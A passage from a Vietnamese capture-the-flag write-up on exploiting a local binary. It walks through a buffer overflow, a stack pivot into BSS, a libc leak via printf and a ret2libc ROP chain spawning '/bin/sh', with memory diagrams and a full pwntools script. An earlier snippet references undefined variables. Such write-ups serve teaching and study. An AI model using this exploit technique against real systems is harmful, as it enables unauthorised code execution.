|       pop_rbp_ret        |
+--------------------------+
|        0x404900          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|           B*32           | #  Thừa 32 byte, cứ để đó vậy
|                          |
+--------------------------+ <- 0x404088 (0x404050->0x404088 vừa đủ 56 byte)
|       pop_rbp_ret        | # Hết 56 byte là return address
+--------------------------+
|        0x404800          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|          C*1888          |
|                          |
+--------------------------+ <-- 0x404800
|                          |
|                          |
|                          |
|                          |
|                          |
+--------------------------+
|                          |
|                          |
|                          |
+--------------------------+ <-- 0x404900
|  0x404900 (RBP an toàn)  |
+--------------------------+ <-- 0x404908
|    main (ret_address)    |
+--------------------------+
             ^
             |
(Bottom of "Stack on BSS" - High Address)          

          ...

========================
========STACK ZONE======
========================

Low Address (Top of Stack)
           |
           v
+-----------------------+ <--- 0x7fff.... (Nơi ghi payload1)
|        buf[48]        |  # A * 48 => 48 byte (Tạm coi buf[48] cũng được)
+-----------------------+
|       Saved RBP       |  # 0x404080: Đích đến của stack pivot
+-----------------------+  
|    Return Address     | <--- # portal_gate_gets (Quay về nhận payload2)
+-----------------------+
            ^
            |
(Bottom of Stack - High Address)
```

---

</details>

<br>

* Tiếp theo là gọi `printf()` để leak địa chỉ `libc`

```python

io = start()

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 

# --- STAGE 2: XÂY DỰNG CÁC GADGET ADDRESS TRÊN BSS, LEAK LIBC ---

# =========== Nửa đầu tiên của Giai đoạn 1 ===============
payload2 = p64(pop_rbp_ret)    # 0x404050: RIP
payload2 += p64(0x404900)      
payload2 += p64(leave_ret)     # Bật RSP lên 0x404900
payload2 += b'B' * 32          # Thừa 32 byte, cứ để đó vậy

# =============== Nửa đầu tiên của Giai đoạn 2==========
payload2 += p64(pop_rbp_ret)        # 0x404088: RIP 
payload2 += p64(0x404800)           # 0x404090: Pop vào RBP = 0x404800
payload2 += p64(leave_ret)          # 0x404098: Bật RSP vọt lên 0x404800!

# ==========Byte rác/Padding căn chỉnh lên 0x404800=======
payload2 += b'C' * 1888 # Đúng bằng khoảng cách 0x4040a0 --> 0x404800

# ==============Nửa còn lại của Giai đoạn 2===============
payload2 += p64(setvbuf_got + 0x30) # 0x404800: Pop vào RBP
payload2 += p64(portal_gate_printf) # 0x404808: Gọi printf (RSP = 0x404810, rất an toàn!)

# ==========Byte rác/Padding lấp đầy lên 0x404900=========
payload2 += b'D' * 240 # Đúng bằng khoảng cách 0x404810 --> 0x404900

# ===============Nửa còn lại của Giai đoạn 1==============
# Gọi lại Main an toàn (Tại 0x404900)
payload2 += p64(0x404900)      # 0x404900: Đặt đúng RBP an toàn
payload2 += p64(main_addr)     # 0x404908: Trở về main!

io.sendline(payload2)
io.recvuntil(b"!\n") # Xóa output rác

# --- STAGE 3: NHẬN VÀ CHUYỂN ĐỊA CHỈ LIBC THÀNH DẠNG HEXA ---
log.info("Step 3: Receiving the leak")
io.recvuntil(prefix)
leak = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Setvbuf leak: {hex(leak)}")

```

<details>
<summary> Minh họa Memory Layout sau khi gửi payload2</summary>

```rust
=========================
=========BSS ZONE========
=========================

Low Address (Top of "Stack on BSS")
             |
             v
           
+--------------------------+  <--- 0x404000
| [0x404000] puts@GLIBC    |  # => 0x7ffff7c87be0 (puts)
+--------------------------+
| [0x404008] printf@GLIBC  |  # => 0x7ffff7c60100 (printf)
+--------------------------+
| [0x404010] gets@GLIBC    |  # => 0x7ffff7c87080 (gets)
+--------------------------+
| [0x404018] setvbuf@GLIBC |  # => 0x7ffff7c88550 (setvbuf)
+--------------------------+
| [0x404020]  data_start   |  # => 0 
+--------------------------+
|           ...            |  
+--------------------------+
|  [0x404048] completed    |  # => 0
+--------------------------+  <-- 0x404050 = 0x404080-0x30 (Nơi ghi payload2)
|       pop_rbp_ret        |
+--------------------------+
|        0x404900          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|           B*32           | #  Thừa 32 byte, cứ để đó vậy
|                          |
+--------------------------+ <- 0x404088 (0x404050->0x404088 vừa đủ 56 byte)
|       pop_rbp_ret        | # Hết 56 byte là return address
+--------------------------+
|        0x404800          |
+--------------------------+
|        leave_ret         |
+--------------------------+
|                          |
|          C*1888          |
|                          |
+--------------------------+ <-- 0x404800
|    setvbuf_got + 0x30    | # Pop vào RBP
+--------------------------+
|  lea_portal_gate_printf  | # Quay lại đoạn lea_printf
+--------------------------+
|                          |
|          D*240           |
|                          |
+--------------------------+ <-- 0x404900
|  0x404900 (RBP an toàn)  |
+--------------------------+ <-- 0x404908
|    main (ret_address)    |
+--------------------------+
             ^
             |
(Bottom of "Stack on BSS" - High Address)          

          ...

========================
========STACK ZONE======
========================

Low Address (Top of Stack)
           |
           v
+-----------------------+ <--- 0x7fff.... (Nơi ghi payload1)
|        buf[48]        |  # A * 48 => 48 byte (Tạm coi buf[48] cũng được)
+-----------------------+
|       Saved RBP       |  # 0x404080: Đích đến của stack pivot
+-----------------------+  
|    Return Address     | <--- # portal_gate_gets (Quay về nhận payload2)
+-----------------------+
            ^
            |
(Bottom of Stack - High Address)

```

</details>


#### Payload cuối cùng: Gọi shell

Dưới đây là script có dùng pwntools để tự động tìm địa chỉ các gadget trong `libc` và kết hợp lại để gọi `system("/bin/sh")`

> Phần cơ bản của kỹ thuật `ret2libc` được trình bày rất dễ hiểu ở link này, nếu bạn chưa hiểu lắm thì có thể xem tại đây:
> 
> https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './vuln')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *portal_gate
b *portal_gate+44
b *portal_gate+72 
b *portal_gate+73 
'''.format(**locals())

# -- Exploit goes here --

io = start()

# Gadgets
portal_gate_gets = 0x4011b1
portal_gate_printf = 0x4011c2
pop_rbp_ret = 0x40117d
leave_ret = 0x4011de
main_addr = 0x4011e0
start_addr = 0x4010b0
setvbuf_got = exe.got['setvbuf']

# --- STAGE 1: ĐƯA RBP VỀ BSS ---
log.info("Step 1: Overwriting RBP")
payload1 = b'A' * 48
payload1 += p64(0x404080)        # RBP = 0x404080 => 0x404050 sẽ chứa payload2
payload1 += p64(portal_gate_gets) # Nhảy lại gets

io.recvuntil(b":\n")
io.sendline(payload1)

# Xóa output rác do đợt in sai đầu tiên
io.recvuntil(b"!\n") 

# --- STAGE 2: XÂY DỰNG CÁC GADGET ADDRESS TRÊN BSS, LEAK LIBC ---

log.info("Step 2: Building Stack on BSS")

# =========== Nửa đầu tiên của Giai đoạn 1 ===============
payload2 = p64(pop_rbp_ret)    # 0x404050: RIP
payload2 += p64(0x404900)      
payload2 += p64(leave_ret)     # Bật RSP lên 0x404900
payload2 += b'B' * 32          # Thừa 32 byte, cứ để đó vậy

# =============== Nửa đầu tiên của Giai đoạn 2==========
payload2 += p64(pop_rbp_ret)        # 0x404088: RIP 
payload2 += p64(0x404800)           # 0x404090: Pop vào RBP = 0x404800
payload2 += p64(leave_ret)          # 0x404098: Bật RSP vọt lên 0x404800!

# ==========Byte rác/Padding căn chỉnh lên 0x404800=======
payload2 += b'C' * 1888 # Đúng bằng khoảng cách 0x4040a0 --> 0x404800

# ==============Nửa còn lại của Giai đoạn 2===============
payload2 += p64(setvbuf_got + 0x30) # 0x404800: Pop vào RBP
payload2 += p64(portal_gate_printf) # 0x404808: Gọi printf (RSP = 0x404810, rất an toàn!)

# ==========Byte rác/Padding lấp đầy lên 0x404900=========
payload2 += b'D' * 240 # Đúng bằng khoảng cách 0x404810 --> 0x404900

# ===============Nửa còn lại của Giai đoạn 1==============
# Gọi lại Main an toàn (Tại 0x404900)
payload2 += p64(0x404900)      # 0x404900: Đặt đúng RBP an toàn
payload2 += p64(main_addr)     # 0x404908: Trở về main!

io.sendline(payload2)
io.recvuntil(b"!\n") # Xóa output rác

# --- STAGE 3: NHẬN VÀ CHUYỂN ĐỊA CHỈ LIBC THÀNH DẠNG HEXA ---
log.info("Step 3: Receiving the leak")
io.recvuntil("Mật khẩu '".encode("utf-8"))
leak = u64(io.recv(6).ljust(8, b'\x00'))
log.success(f"Setvbuf leak: {hex(leak)}")

# --- STAGE 4: RET2LIBC TỰ ĐỘNG THÔNG MINH ---

# Load file libc hệ thống (Pwntools sẽ tự động phân tích)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 

# Đặt địa chỉ base bằng cách trừ đúng symbol nội bộ của nó
libc.address = leak - libc.symbols['setvbuf']
log.success(f"Libc base CHUẨN: {hex(libc.address)}")

# Tự động trích xuất các địa chỉ cần thiết
system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))

# Tự động tìm gadget 'pop rdi' và 'ret' trực tiếp bên trong libc
rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
ret_gadget = rop_libc.find_gadget(['ret'])[0]

io.recvuntil(b":\n")
log.info("Step 4: Final Payload for Shell!")

payload3 = b'E' * 56
payload3 += p64(pop_rdi)
payload3 += p64(bin_sh)
payload3 += p64(ret_gadget)
payload3 += p64(ret_gadget)
payload3 += p64(system)

io.sendline(payload3)

log.success("HACKER MAN! ENJOY YOUR SHELL!")
io.interactive()
```
